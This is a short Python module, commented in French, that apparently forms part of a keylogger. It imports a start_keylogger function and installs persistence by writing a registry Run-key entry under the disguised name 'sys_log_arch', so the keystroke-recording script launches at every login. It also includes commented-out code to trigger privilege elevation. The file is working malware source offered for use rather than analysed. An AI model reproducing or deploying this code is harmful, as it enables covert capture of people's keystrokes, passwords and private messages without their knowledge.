import os
import sys
import ctypes
from recording_keyboard import start_keylogger


# Fonction de vérification des droits d'administrateur
# def run_as_admin():
#     if ctypes.windll.shell32.IsUserAnAdmin():
#         return True
#     else:
#         # Élévation des privilèges
#         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
#         return False


# Fonction d'ajout du fichier à la liste de démarrage
def add_to_startup(cle, valeur):
    try:
        # Importation de la bibliothèque pour travailler avec le registre
        import winreg as reg
    except ImportError:
        import _winreg as reg  # Pour les anciennes versions de Python

    try:
        # Ouverture de la clé du registre
        reg_key = reg.HKEY_CURRENT_USER
        chemin_cle = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg.CreateKey(reg_key, chemin_cle)
        registry_key = reg.OpenKey(reg_key, chemin_cle, 0, reg.KEY_WRITE)

        # Enregistrement de la valeur dans la clé du registre
        reg.SetValueEx(registry_key, cle, 0, reg.REG_SZ, valeur)

        # Fermeture de la clé du registre
        reg.CloseKey(registry_key)

        print(f"Démarrage automatique pour {cle} a été mis en place avec succès.")
    except Exception as e:
        print("Il y a eu une erreur :", str(e))


def main_startup():
    print("Des droits d'administrateur sont requis pour que ce script fonctionne.")

    # if not run_as_admin():
    #     return

    python_exe = sys.executable

    # Chemin vers votre script
    chemin_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'recording_keyboard.py')

    # Création d'une entrée dans le registre pour le démarrage automatique du script
    add_to_startup("sys_log_arch", f'"{python_exe}" "{chemin_script}"')
    print("Ajouté à la lecture automatique.")